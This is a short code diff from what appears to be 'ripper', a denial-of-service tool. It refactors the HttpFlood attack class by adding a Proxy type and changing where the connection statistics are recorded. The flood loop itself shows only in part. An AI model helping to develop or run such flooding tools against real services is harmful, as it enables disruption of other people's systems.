@@ -9,6 +9,7 @@ from ripper.constants import HTTP_STATUS_CODE_CHECK_PERIOD_SEC
 from ripper.errors import *
 from ripper.context.target import Target
 from ripper.actions.attack_method import AttackMethod
+from ripper.proxy import Proxy
 
 HTTP_STATUS_PATTERN = re.compile(r" (\d{3}) ")
 # Forward Reference
@@ -23,7 +24,7 @@ class HttpFlood(AttackMethod):
 
     _target: Target
     _ctx: Context
-    _proxy: Any = None
+    _proxy: Proxy = None
     _http_connect: socket = None
 
     def __init__(self, target: Target, context: Context):
@@ -39,7 +40,7 @@ class HttpFlood(AttackMethod):
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as self._http_connect:
             self._http_connect.connect(self._target.hostip_port_tuple())
-            self._ctx.target.statistic.connect.status_success()
+            self._target.statistic.connect.status_success()
             while self.send(self._http_connect):
                 if self._ctx.dry_run:
                     break
